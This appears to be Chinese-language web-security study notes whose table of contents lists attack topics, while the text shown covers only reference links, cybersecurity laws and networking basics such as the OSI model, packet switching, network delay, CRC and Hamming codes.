内容索引

## 1.[序章](#_bookmark0) 

1.  [Web 技术演化](#1.1  web-技术演化) 

2.  [网络攻防技术演化](#1.2网络攻防技术演化) 

3.  [网络安全观](#1.3网络安全观) 

4.  [法律与法规](#1.4法律与法规) 

## 2.[计算机网络与协议](#_bookmark5) 

1.  [网络基础](#2.1 网络基础)
2.  [物理层](#2.2 物理层)
3.  [数据链路层](#2.3 数据链路层)
4.  [网络层](#2.4 网络层)
5.  [传输层](#2.5 传输层)
6.  [应用层](#2.6 应用层)  
7.  [SSL/TLS](#2.7 SSL/TLS)
8.  [IPsec](#2.8 ipsec)
11.  [WiFi](#2.9 WiFi)

## 3.[信息收集](#_bookmark17) 47

1.  [网络入口/信息](#3.1  网络入口信息)
2.  [域名信息](#3.2  域名信息)
3.  [端口信息](#3.3  端口信息)
4.  [站点信息](#3.4  站点信息)
5.  [搜索引擎利用](#3.5  搜索引擎利用)
6.  [社会工程学](#3.6  社会工程学)

## 4.[常见漏洞攻防](#_bookmark25) 63

1. [SQL 注入](#4.1  sql-注入)
2. [XSS](#4.2  xss)

3. [CSRF](#csrf)

4. [SSRF](#ssrf)

5. [命令注入](#命令注入)
6. [目录穿越](#目录穿越)

7. [文件读取](#文件读取-1)

8. [文件上传](#文件上传)
9. [文件包含](#文件包含)
10. [XXE](#xxe)
11. [模版注入](#模版注入)
12. [Xpath 注入](#xpath-注入)
13. [逻辑漏洞 / 业务漏洞](#逻辑漏洞-业务漏洞)
14. [配置与策略安全](#配置与策略安全) 131
15. [中间件](#中间件-1) 132
16. [Web Cache 欺骗攻击](#web-cache-欺骗攻击) 135
17. [HTTP 请求走私](#http-请求走私) 137

&nbsp;

## 5.[语言与框架](#_bookmark43) 141

[5.1 PHP](#5.1  php) 141

[5.2 Python](#5.2 Python) 166

[5.3 Java](#5.3 Java) 171

2.  [JavaScript](#javascript) 203

3.  [Golang](#golang) 217

4.  [Ruby](#ruby) 218

[5.7 ASP](#asp) 218

8.  [PowerShell](#powershell) 218

9.  [Shell](#shell) 221

10. [CSharp/C#](#csharp) 222

&nbsp;

6.  [内网渗透](#_bookmark54) 225

    1.  [Windows 内网渗透](#windows-内网渗透) 225

    2.  [Linux 内网渗透](#linux-内网渗透) 248

    3.  [后门技术](#后门技术) 255

    4.  [综合技巧](#综合技巧) 258

    5.  [参考链接](#参考链接-33) 260

[7 云安全](#_bookmark60) 263

1.  [容器标准](#容器标准) 263

2.  [Docker](#docker) 264

3.  [参考链接](#参考链接-35) 271
    | > [10.14 安全开发](#安全开发) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . |                       |                                                                                               | 357     |
    +=============================================================================================================================+=======================+===============================================================================================+=========+
    | > [10.15 运维](#运维) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   |                       |                                                                                               | 357     |
    +-----------------------------------------------------------------------------------------------------------------------------+-----------------------+-----------------------------------------------------------------------------------------------+---------+
    | > [10.16 取证](#取证) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   |                       |                                                                                               | 361     |
    +-----------------------------------------------------------------------------------------------------------------------------+-----------------------+-----------------------------------------------------------------------------------------------+---------+
    | > [10.17 其他](#其他-8) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . |                       |                                                                                               | 361     |
    +-----------------------------------------------------------------------------------------------------------------------------+-----------------------+-----------------------------------------------------------------------------------------------+---------+
    | [**11 手册速查**](#_bookmark108)                                                                                            |                       |                                                                                               | **365** |
    +-----------------------------------------------------------------------------------------------------------------------------+-----------------------+-----------------------------------------------------------------------------------------------+---------+
    | [11.1](#爆破工具)                                                                                                           | [爆破工具](#爆破工具) | . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . | 365     |
    +-----------------------------------------------------------------------------------------------------------------------------+-----------------------+-----------------------------------------------------------------------------------------------+---------+
    | [11.2](#下载工具)                                                                                                           | [下载工具](#下载工具) | . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . | 366     |
    +-----------------------------------------------------------------------------------------------------------------------------+-----------------------+-----------------------------------------------------------------------------------------------+---------+
    | [11.3](#流量相关)                                                                                                           | [流量相关](#流量相关) | . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . | 367     |
    +-----------------------------------------------------------------------------------------------------------------------------+-----------------------+----------------------------------[11.4](#嗅探工具)[嗅探工具](#嗅探工具) | . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . | 370     |
    +-----------------------------------------------------------------------------------------------------------------------------+-----------------------+-----------------------------------------------------------------------------------------------+---------+

> [11.5 SQLMap 使用](#sqlmap-使用) 374
>
> [**12 其他**](#_bookmark114) **377**
>
> [12.1 代码审计](#代码审计) 377
>
> [12.2 WAF](#waf-1) 381
>
> [12.3 常见网络设备](#常见网络设备) 385
>
> [12.4 指纹](#指纹-1) 389

5.  [Unicode](#unicode) 390

6.  [JSON](#json) 396

7.  [拒绝服务攻击](#拒绝服务攻击-1) 397

8.  [邮件安全](#邮件安全) 399

> [12.9 APT](#apt-1) 399

10. [供应链安全](#供应链安全-2) 402

11. [近源渗透](#近源渗透-1) 402

12. [常见术语](#常见术语) 404

# 一. 序章

## 1.1 Web 技术演化

### 1.1.6  参考链接

-   [Scaling webapps for newbs](https://arcentry.com/blog/scaling-webapps-for-newbs-and-non-techies/)

-   [GitHub 的 Restful HTTP API 设计分解](https://learnku.com/articles/24050)

&nbsp;

## 1.2 网络攻防技术演化

### 1.2.2  参考链接

-   [OWASP](https://en.wikipedia.org/wiki/OWASP)

-   [NT Web Technology Vulnerabilities](http://www.phrack.com/issues.html?issue=54&id=8)

-   [History of CVE](https://cve.mitre.org/about/history.html)

-   [history of some vulnerabilities and exploit techniques](https://documents.pub/document/history-of-some-vulnerabilities-and-exploit-techniques.html)

-   [securitydigest](http://securitydigest.org/)

-   [Early Computer Security Papers: Ongoing Collection](http://seclab.cs.ucdavis.edu/projects/history/CD/)

-   [Security Mailing List Archive](https://seclists.org/)

-   [Computer Security Technology Planning Study](https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72.pdf)

-   [Smashing The Stack For Fun And Profit](https://inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf)

-   [Happy 10th birthday Cross-Site Scripting!](https://docs.microsoft.com/en-us/archive/blogs/dross/happy-10th-birthday-cross-site-scripting)

-   [About Microsoft SDL](https://www.microsoft.com/en-us/securityengineering/sdl/about)

-   [ABOUT ZDI](https://www.zerodayinitiative.com/about/)

-   [Open-source intelligence](https://en.wikipedia.org/wiki/Open-source_intelligence)

-   [Runtime Application Self-protection (RASP)](https://www.gartner.com/en/information-technology/glossary/runtime-application-self-protection-rasp)

-   [ZMap: Fast Internet-Wide Scanning and its Security Applications](https://zmap.io/paper.pdf)

-   [A Search Engine Backed by Internet-Wide Scanning](https://censys.io/static/censys.pdf)

-   [Black hat About](https://www.blackhat.com/about.html)

-   [The DEF CON Story](https://www.defcon.org/html/links/dc-about.html)

-   [Reflections on Trusting Trust](https://users.ece.cmu.edu/~ganger/712.fall02/papers/p761-thompson.pdf)

-   [What is DevSecOps?](https://www.devsecops.org/blog/2015/2/15/what-is-devsecops)

&nbsp;

## 1.3 网络安全观

## 1.4  法律与法规

### 1.4.1  相关链接

-   [中华人民共和国网络安全法](http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm)

-   [网络产品安全漏洞管理规定](http://www.gov.cn/zhengce/zhengceku/2021-07/14/content_5624965.htm)

-   [关键信息基础设施安全保护条例](http://www.gov.cn/zhengce/content/2021-08/17/content_5631671.htm)

-   [中华人民共和国个人信息保护法](http://www.npc.gov.cn/npc/c30834/202108/a8c4e3672c74491a80b53a172bb753fe.shtml)

-   [中华人民共和国数据安全法](http://www.npc.gov.cn/npc/c30834/202106/7c9af12f51334a73b56d7938f99a788a.shtml)



# 二. 计算机网络与协议

[计算机网络知识点超详细](https://blog.csdn.net/qq_46101869/article/details/118108697?utm_source=app&app_version=5.5.0&code=app_1562916241&uLinkId=usr1mkqgl919blen)

## 2.1 网络基础

### 2.1.1 计算机通信网的组成

**计算机网络由通信子网和资源子网组成。**其中**通信子网**负责数据的无差错和有序传递，其处理功能包括差错控制、流量控制、路由选择、网络互连等。其中**资源子网**是计算机通信的本地系统环境，包括主机、终端和应用程序等，资源子网的主要功能是用户资源配置、数据的处理和管理、软件和硬件共享以及负载均衡等。

总的来说，计算机通信网就是一个由通信子网承载的、传输和共享资源子网的各类信息的系统。

**网络边缘**:位于互联网边缘与互联网相连的计算机和其他设备,如桌面计算机、移动计算机、服务器、其他智能终端设备
**网络核心**:由互联端系统的分组交换设备和通信链路构成的网状网络
如：分组交换路由器、链路层交换机、通信链路(光纤、铜缆、无线电、激光链路)

#### 网络分类

##### 个域网PAN（ Personal Area Network ）

- 能在便携式消费电器与通信设备之间进行短距离通信的网络

- 覆盖范围一般在10米半径以内，如蓝牙耳机等

##### 局域网LAN（Local Area Network）

- 局部地区形成的区域网络，如企业网络

- 分布地区范围有限，可大可小，大到一栋建筑、小到办公室内的组网
- 电脑WLAN接入，打印机共享等等

##### 城域网MAN（Metropolitan Area Network ）

- 范围覆盖一个城市的网络

##### 广域网WAN（Wide Area Network）

- 覆盖很大地理区域，乃至覆盖地区和国家

#### 接入网

##### 接入网的用途

- 接入网的**用途**是将主机连接到边缘路由器上
- **边缘路由器**是端系统Host去往任何其他远程端系统的路径上的第一台路由器

各种异构网络通过边缘路由器接入

##### 接入网分类：

- 光纤到户FTTH
- 数字用户线DSL
- 同轴电缆
- 无线接入
- 企业和家庭网络

#### 网络核心的两大功能

##### 1.路由

确定数据分组从源到目标所使用的路径（**全局操作**）

##### 2.转发

路由器或交换机将接收到的数据分组转发出去（即移动到该设备的某个输出接口）（**本地操作**）

### 2.1.2 通信协议

**网络协议**（network protocol），简称为协议，是为进行网络中的数据交换而建立的**规则，标准或约定**，并不是计算机网络实体的组成部分。

**协议**规定了通信实体之间所交换的消息的格式，意义，顺序以及针对收到消息或发生的事件所采取的“动作”（actions），规范了网络中所有信息发送和接收过程。

- 协议例如：TCP，IP，HTTP，Skype，802.11

**协议**涉及到三个要素，分别为：

-   **语法（Syntax）**：用户数据与控制信息的结构与格式，以及数据出现顺序的意义（是信号电平）
-   **语义（Semantics）**：需要发出何种控制信息，完成何种动作以及做出何种响应。用于解释比特流的每一部分的意义（差错检测）
-   **时序（Timing）**：事件实现顺序的详细说明（速度匹配）

### 2.1.3 OSI 七层模型

#### 简介

OSI（Open System Interconnection）共分为物理层、数据链路层、网络层、传输层、会话层、表示层、应用层七层，其具体的功能如下。

#### 物理层

-   提供建立、维护和释放物理链路所需的机械、电气功能和规程等特性

-   通过传输介质进行数据流 (比特流) 的物理传输、故障监测和物理层管理

-   从数据链路层接收帧，将比特流转换成底层物理介质上的信号

#### 数据链路层(Data Link Layer)

- 实现相邻（Neighboring）网络实体间的数据传输

- 成帧（Framing）：从物理层的比特流中提取出完整的帧

- 错误检测与纠正：为提供可靠数据通信提供可能

- 物理地址（MAC address）：48位，理论上唯一网络标识，烧录在网卡，不便更改

- 流量控制，避免“淹没”（overwhelming）:当快速的发送端遇上慢速的接收端，接收端缓存溢出

- 共享信道上的访问控制（MAC）：同一个信道，同时传输信号。如同：同一个Wifi热点（AP）连接着多个无线用户（手机），则多个用户同时需要发送数据，如何控制发送顺序？


#### 网络层(Network Layer)

-   将数据包跨越网络从源设备发送到目的设备（host to host）
-   路由（Routing）：在网络中选取从源端到目的端转发路径，常常会根据网络可达性动态选取最佳路径，也可以使用静态路由
-   路由协议：路由器之间交互路由信息所遵循的协议规范，使得单个路由器能够获取网络的可达性等信息
-   服务质量（QoS）控制：处理网络拥塞、负载均衡、准入控制、保障延迟
-   异构网络互联：在异构编址和异构网络中路由寻址和转发
-   [IP协议](##2.2  IP协议)
-   [ICMP协议](##2.3  ICMP协议)
-   [ARP协议](##2.4  ARP协议)

#### 传输层

-   将数据从源端口发送到目的端口（进程到进程）
-   网络层定位到一台主机（host），传输层的作用域具体到主机上的某一个进程
-   网络层的控制主要面向运营商，传输层为终端用户提供端到端的数据传输控制
-   两类模式：可靠的传输模式，或不可靠传输模式
-   可靠传输：可靠的端到端数据传输，适合于对通信质量有要求的应用场景，如文件传输等
-   不可靠传输：更快捷、更轻量的端到端数据传输，适合于对通信质量要求不高，对通信响应速度要求高的应用场景，如语音对话、视频会议等
-   提供无差错的数据传输
-   接收来自会话层的数据，如果需要，将数据分割成更小的分组，向网络层传送分组并确保分组完整和正确到达它们的目的地
-   [UDP协议](##2.5  UDP协议)
-   [TCP协议](##2.6  TCP协议)

#### 会话层

-   提供节点之间通信过程的协调

-   负责执行会话规则（如：连接是否允许半双工或全双工通信）、同步数据流以及当故障发生时重新建立连接

-   使用上面的表示层和下面的传输层的功能

#### 表示层

-   提供数据格式、变换和编码转换

-   涉及正在传输数据的语法和语义

-   将消息以合适电子传输的格式编码

-   执行该层的数据压缩和加密

-   从应用层接收消息，转换格式，并传送到会话层，该层常合并在应用层中

#### 应用层

- 包括各种协议，它们定义了具体的面向用户的应用：如电子邮件、文件传输等，通过应用层协议，提供应用程序便捷的网络服务调用

- [http协议](##2.12  HTTP协议簇)

- [https协议](###2.12.3  HTTPS)

- [Telnet协议与SSH协议](##2.9  Telnet协议与SSH协议)

- [DNS域名系统](##2.10  DNS域名系统)

- [FTP协议与TFTP协议](##2.11  FTP协议与TFTP协议 )

  

#### 总结

低三层模型属于通信子网，涉及为用户间提供透明连接，操作主要以每条链路（hop-by-hop）为基础，在节点间的各条数据链路上进行通信。由**网络层**来控制各条链路上的通信，但要依赖于其他节点的协调操作。

高三层属于资源子网，主要涉及保证信息以正确可理解形式传送。

传输层是高三层和低三层之间的接口，它是**第一个端到端的层次**，保证透明的端到端连接，满足用户的服务质量（QoS）要求，并向高三层提供合适的信息形式。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220519103646530.png" alt="image-20220519103646530" style="zoom:50%;" />

**OSI模型和TCP/IP模型比较**

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602111014378.png" alt="image-20220602111014378" style="zoom: 50%;" />



## 2.2 物理层

### 2.2.1 物理介质

### 2.2.2 数据交换方式

#### 1.电路交换

最典型的电路交换网络：电话网络

电路交换的三个阶段：

- 建立连接（呼叫--->电路建立）
- 通信
- 释放连接

特点：**独占电路资源**

电路交换示意图

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505163342765.png" alt="image-20220505163342765" style="zoom: 33%;" />

#### 2.报文交换

报文：源（应用）发送的信息整体（比如：一个文件，一个音频等等）

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505164414917.png" alt="image-20220505164414917" style="zoom: 33%;" />

1. 主机A将整段报文发送（发送时间取决于主机A输出端口的带宽）

2. 路由器1接收报文后，先将报文放入缓存区（复制报文），确认报文正确传输后才能删除该副本
3. 经过路由选择算法，路由器1选择通过路由器2进行传输，同时删除副本
4. 路由器2经过相同的过程，将报文发送至主机B
   - 因为不同的报文长度不同，所以路由器只能根据最大的报文来预定存储空间（否则长报文无法完全缓存，而较短的报文肯定能缓存下来），但是如果传递的大部分报文都是短报文，会造成路由器存储空间的利用率降低
   - 因为整段报文长度较大，所以出错可能性大，出错重传花费的时间就比较长

#### 3.分组交换

由报文拆分出来的一系列相对较小的数据包，需要报文的拆分与重组，会产生额外的开销。

报文交换与分组交换都采用存储转发的交换方式。

**区别：**

- 报文交换以**完整的报文**进行存储转发
- 分组交换以较小的**分组**进行存储转发

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505164745496.png" alt="image-20220505164745496" style="zoom:33%;" />

1. 将报文划分成固定格式和最大长度限制的分组进行传输（每个分组长度相同，较小的分组长度有利于查错）

2. 不同的分组到达路由器1后，路由器1先对分组进行查错等处理

3. 将处理好的分组放入输出端口的队列（队列中无分组时，可以直接发送，但如果有分组就需要等待前面的分组传输完成）

   <img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505164901323.png" alt="image-20220505164901323" style="zoom: 50%;" />

4. 路由器1经过路由选择算法选择路由器2

5. 路由器2经过同样步骤将不同分组传输到主机B

**Q：分组交换为什么会产生丢包和延迟**

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505165221795.png" alt="image-20220505165221795" style="zoom: 50%;" />

**分组在路由器的缓存中排队**

- 分组到达速率超出链路输出容量（输出缓冲区）时，会产生丢包

- 分组排队，等待输出链路（排队中的分组）可用：例如图中橙色的要等它前面的紫色的分组输出后，才轮到它被发送

**丢包了会发生什么：**

- 丢弃的分组由前序结点重发

- 不重发

**丢包率 = 丢包数 /已发分组总数**

#### 计算机网络性能

##### 带宽(bandwidth)

原本指信号具有的频带宽度,即最高频率与最低频率之差，单位是赫兹(Hz)。网络的“带宽”通常是数字信道所能传送的“ **最高数据率** ” ，单位: b/s (bps：bit per second)

1 Mb/s = 10^6 b/s ，1 Gb/s = 10^9 b/s，1 Tb/s = 10^12 b/s （ 这里的b指的是bit的缩写）

##### 速率

即数据率（data rate）或称数据传输速率或比特率（bit rate）。速率往往指额定速率或标称速率。

- 单位时间（秒）传输信息（比特）量，是计算机网络中最重要的一个性能指标
- 单位：b/s (bps：bit per second)，1 Mb/s = 10^6 b/s ，1 Gb/s = 10^9 b/s，1 Tb/s = 10^12 b/s （ 这里的b指的是bit的缩写）

##### 4种网络延迟

![1](C:/Users/86184/%E6%A1%8C%E9%9D%A2/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%BD%91%E7%AB%99/%E5%9B%BE%E7%89%87/1.jpg)

###### 1.d(proc)：结点处理时延

- 差错检测
- 确定输出链路
- 通常小于msec（毫秒）

###### 2.d(queue)：排队时延

绝对的排队延迟比较难估计，所以一般估计平均排队延迟

- R：链路带宽(bps)
- L：分组长度(bits)
- a：平均分组到达速率


**流量强度**(trafficintensity)=La/R

- La/R ~ 0：平均排队延迟很小
- La/R ~ 1：平均排队延迟很大
- La/R > 1：超出服务能力，平均排队延迟无限大（需要传输的比特数率【不是错别字，就是比特数量到达的速率】> 带宽 ，那可以理解为超出服务能力：一个水龙头每秒最多放水1L，而每秒需要这个水龙头放的水是2L，水龙头表示做不到）

##### 3.d(trans)：传输时延

- R：链路带宽(bps)
- L：分组长度(bits)
- d(trans)=L/R

##### 4.d(prop)：传播时延

- d：物理链路长度
- s：信号传播速度（约为2x10^8m/sec）
- d(prop)=d/s

##### 时延带宽积

链路的时延带宽积又称为以比特为单位的链路长度

**时延带宽积=传播时延*带宽=d(prop)\*R**

***Q：传输延时（发送延时）与传播延时的区别***

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505165832075.png" alt="image-20220505165832075" style="zoom: 50%;" />

- 货物：分组
- 传送带：传播链路
- 传送带的转速：传播链路的带宽
- 人搬运货物的速度：传输链路的带宽
- 传输延时：人将货物搬上传送带所花费的时间
- 传播延时：传送带将货物从起点送到终点花费的时间

### 2.2.3 信道复用

## 2.3 数据链路层

### 2.3.1 功能（三个重要问题）

链路（Link）：从一个结点到相邻结点的一段物理线路，而中间没有其他任何的交换结点

数据链路（Data Link）：指把实现通信协议的硬件和软件加到链路上，就构成了数据链路。数据链路层以**帧**为单位传输和处理数据。

#### 1.封装成帧（Framing）

##### 要解决的关键问题：如何标识一个帧的开始？

- 接收方必须能从物理层接收的比特流中明确区分出一帧的开始和结束，此问题被称为**帧同步或帧定界**

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220515233218573.png" alt="image-20220515233218573" style="zoom:50%;" />

- 定义：数据链路层为上层交付的协议数据单元添加帧头和帧尾的过程。

- 接收端以便从收到的比特流中识别帧的开始与结束，帧定界是分组交换的必然要求。

- **分组交换的一个重要概念**：就是所有在因特网上传送的数据都是以分组(即IP数据报)为传送单位。

- 网络层的IP数据报传送到数据链路层就成为帧的数据部分。在帧的数据部分的前面和后面分别添加上首部和尾部，就构成了一个完整的帧。

- 帧长等于数据部分长度加上帧首部和帧尾部的长度，而首部和尾部的一个重要作用就是进行帧定界。

- 首部和尾部还包含许多必要的控制信息，在发送帧时，是从帧首部开始发送。

- 各种数据链路层协议都要对帧首部和帧尾部的格式有明确的规定。

- **为了提高帧的传输效率，应当使帧的数据部分长度尽可能远大于首部和尾部的长度。但是，每一种链路层协议都规定了帧的数据部分的长度上限——最大传送单元MTU(Maximum Transfer Unit)。**

  <img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220515233923055.png" alt="image-20220515233923055" style="zoom:50%;" />

- 当数据是由可打印的ASCII码组成的文本文件时，帧定界可以使用特殊的帧定界符。

- 控制字符SOH(Start Of Header)放在一帧的最前面，表示帧的首部开始。另一个控制字符EOT(End Of Transmission)表示帧的结束。他们的十六进制编码分别是01(二进制是00000001)和04(二进制是00000100)。

  <img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220515233955929.png" alt="image-20220515233955929" style="zoom:50%;" />

- 当数据在传输中出现差错时，帧定界符的作用更加明显。假定发送端在尚未发完一个帧时突然出现故障，中断了发送。但随后很快又恢复正常，于是重新从头开始发送刚才未发送完的帧。**由于使用了帧定界符，在接收端就知道前面收到的数据时个不完整的帧(只有首部SOH，没有传输结束符EOT)，必须丢弃。而后面收到的数据有明显的帧定界符(SOH和EOT)，因此这是一个完整的帧，应当收下。**

##### 封装成帧的方式

###### 1.带比特填充的定界符法

定界符：两个0比特之间，连续6个1比特，即01111110，0x7E

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602192052499.png" alt="image-20220602192052499" style="zoom:50%;" />

发送方检查有效载荷：若在有效载荷中出现连续5个1比特，则直接插入1个0比特

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602192115783.png" alt="image-20220602192115783" style="zoom:50%;" />

接收方的处理：
若出现连续5个1比特，
若下一比特为0，则为有效载荷，直接丢弃0比特；
若下一比特为1，则连同后一比特的0，构成定界符，一帧结束

###### 2.物理层编码违例

- **核心思想**：选择的定界符不会在数据部分出现

- 4B/5B编码方案：4比特数据映射成5比特编码，剩余的一半码字（16个码字）未使用，可以用做帧定界符

  例如： 00110组合不包含在4B/5B编码中，可做帧定界符

- 前导码：存在很长的前导码（preamble），可以用作定界符

  例如：传统以太网、802.11

- 曼切斯特编码/差分曼切斯特编码：正常的信号在周期中间有跳变，持续的高电平（或低电平）为违例码，可以用作定界符

  例如：802.5令牌环网

#### 2.差错检测

##### 背景

链路层存在的一个**问题**：信道的噪声导致数据传输问题

- 差错（ incorrect ）：数据发生错误

- 丢失（ lost ）：接收方未收到
- 乱序（out of order）：先发后到，后发先到
- 重复（repeatedly delivery）：一次发送，多次接收

解决方案：差错检测与纠正、确认重传

- 确认：接收方校验数据（差错校验），并给发送方应答，防止差错
- 定时器：发送方启动定时器，防止丢失
- 顺序号：接收方检查序号，防止乱序递交、重复递交



- 传输差错：可分为两大类，一类就是最基本的比特差错，另一类就是收到的帧并没有出现比特错误，但却出现了帧丢失、帧重复或帧失序。
- 比特差错：就是比特在传输过程中可能会产生差错，即1可能会变成0，0可能会变成1。比特差错是传输差错中的一种。
- 三个帧：[#1]-[#2]-[#3]，假定在接收端收到的却有可能出现的情况：
- (1)帧丢失：收到[#1]-[#3]（丢失了[#2]）。
- (2)帧重复：收到[#1]-[#2]-[#2]-[#3]（收到两个[#2]）。
- (3)帧失序：收到[#1]-[#3]-[#2]（后面发的帧反而先到达了接收端，这与一般的数据链路层传输概念不一样）。
- 误码率BER(Bit Error Rate)：就是在一段时间内，传输错误的比特占所传输比特总数的比率。例如，误码率为10^(-10)时，表示平均每传送10^10个比特就会出现一个比特的差错。误码率与信噪比有很大的关系，如果提高信噪比，就可以使误码率减小。
- 问题：实际的通信链路并非理想的，它不可能使误码率下降到零。
- 问题分析：为了保证数据传输的可靠性，在计算机网络传输数据时，必须采用各种检测措施。
- 解决方法：目前在数据链路层广泛使用了循环冗余检验CRC(Cyclic Redundancy Check)的检测技术。
- 注：在数据链路层使用CRC检验，能够实现无比特差错的传输，但这还不是可靠传输。

##### 差错检验与纠正

###### 目标

保证一定差错检测和纠错能力的前提下，如何减少冗余信息量？

###### 考虑的问题

- 信道的特征和传输需求

- 冗余信息的计算方法、携带的冗余信息量
- 计算的复杂度等

###### 两种主要策略

**检错码（error-detecting code）**

在被发送的数据块中，包含一些冗余信息，但这些信息只能使接收方推断是否发生错误但不能推断哪位发生错误，接收方可以请求发送方重传数据主要用在高可靠、误码率较低的信道上，例如光纤链路偶尔发生的差错，可以通过重传解决差错问题

**纠错码（error-correcting code)**

发送方在每个数据块中加入足够的冗余信息，使得接收方能够判断接收到的数据是否有错，并能纠正错误（定位出错的位置）主要用于错误发生比较频繁的信道上，如无线链路也经常用于物理层，以及更高层（例如，实时流媒体应用和内容分发）使用纠错码的技术通常称为前向纠错（FEC，Forward Error Correction)

**常用的检错码包括：**

1.奇偶检验 (Parity Check)

1位奇偶校验是最简单、最基础的检错码。

1位奇偶校验：增加1位校验位，可以检查奇数位错误。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602193149960.png" alt="image-20220602193149960" style="zoom: 33%;" />

2.校验和 (Checksum)

主要用于TCP/IP体系中的网络层和传输层

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602193234519.png" alt="image-20220602193234519" style="zoom:50%;" />

3.循环冗余校验 (Cyclic Redundancy Check，CRC)

数据链路层广泛使用的校验方法

**CRC校验码计算方法**

- 设原始数据D为k位二进制位模式

- 如果要产生n位CRC校验码，事先选定一个n+1位二进制位模式G (称为生成多项式，收发双方提前商定)，G的最高位为1
- 将原始数据D乘以2^n （相当于在D后面添加 n 个 0），产生k+n位二进制位模式，用G对该位模式做模2除，得到余数R（n位，不足n位前面用0补齐）即为CRC校验码

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602193334678.png" alt="image-20220602193334678" style="zoom:50%;" />

**CRC校验码计算示例**

- D = 1010001101

- n = 5
- G = 110101 或 G = x5 + x4 + x2 + 1
- R = 01110
- 实际传输数据：101000110101110

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602193418871.png" alt="image-20220602193418871" style="zoom:50%;" />

4.汉明码
目标：以奇偶校验为基础，找到出错位置，提供1位纠错能力

- 给定n位待发送的数据，首先确定校验位的个数k（根据2^k≥k+n+1）

- 确定校验位在码流中的位置，2^i,i=0,1,2,……，得到校验位P_1,P_2,P_4,P_8,……

- 确定分组，即每个校验位分别负责哪些数据位

  P_1负责位置号的二进制符合XXXX1形式的数据位，即1,3,5,7,9,……

  P_2负责位置号的二进制符合XXX1X形式的数据位，即2,3,6,7,10,……

  P_3负责位置号的二进制符合XX1XX形式的数据位，即4,5,6,7,12,13,14,15,……

- 基于偶校验确定每组的校验位（0或1）

注：汉明码是采用奇偶校验的码。它采用了一种非常巧妙的方式，把这串数字分了组，通过分组校验来确定哪一位出现了错误。

实际的海明码编码的过程也并不复杂，我们通过用不同过的校验位，去匹配多个不同的数据组，确保**任何一个数据位出错，都会产生一个多个校验码位出错的唯一组合**。这样，在出错的时候，我们就可以**反过来找到出错的数据位**，并纠正过来。当只有一个校验码位出错的时候，我们就知道实际出错的是校验码位了。

#### 3.透明传输

- 由于帧的开始和结束的标记是使用专门指明的控制字符，因此，所传输的数据中的任何8比特的组合一定不允许和用作帧定界的控制字符的比特编码一样，否则就会出现帧定界的错误。

- 当传送的帧使用文本文件组成的帧时(文本文件中的字符都是从键盘上输入的)，其数据部分显然不会出现像SOH或EOT这样的帧定界控制字符。可见不管从键盘上输入什么字符都可以放在这样的帧中传输过去（就好像数据链路层不存在一样），因此这样的传输就是透明传输。

- 问题：当数据部分是非ASCII码的文本文件时(如二进制代码的计算机程序或图像等)，情况就不同了，如果数据中的某个字符的二进制代码恰好和SOH或EOT这种控制字符一样，数据链路层就会错误地找到帧的边界，把部分帧收下(误认为是完整的帧)，而把剩下的那部分数据丢弃(这部分找不到帧定界控制字符SOH)。这样的帧的传输显然就不是透明传输。

  <img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220515234354507.png" alt="image-20220515234354507" style="zoom:50%;" />

- 问题分析：为了解决透明传输的问题，就必须设法使数据中可能出现的控制字符”SOH”和”EOT”在接收端不被解析为控制字符。

- 解决方法：发送端的数据链路层在数据中出现控制字符”SOH”和”EOT”的前面插入一个转义字符”ESC”(其十六进制编码是1B)。而在接收端的数据链路层在将数据送往网络层之前删除这个插入的转义字符。这种方法称为**字节填充(byte stuffing)或字符填充(character stuffing)**。如果转义字符也出现在数据当中，那么解决方法仍然是在转义字符的前面插入一个转义字符。因此，当接收端收到连续的两个转义字符时，就删除其中前面的一个。

  <img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220515234422039.png" alt="image-20220515234422039" style="zoom:50%;" />

**补充：** OSI的观点是必须把数据链路层做成是可靠传输的。因此在CRC检测基础上，增加了帧编号、确认和重传机制。收到正确的帧就要向发送端发送确认。发送端在一定的期限内若没有收到对方的确认，就认为出现了差错，因而就进行重传，直到收到对方的确认为止。

这种方法在历史上曾经起到很好的作用。但现在的通信线路的质量已经大大提高了，由通信链路质量不好引起差错的概率已经大大降低。

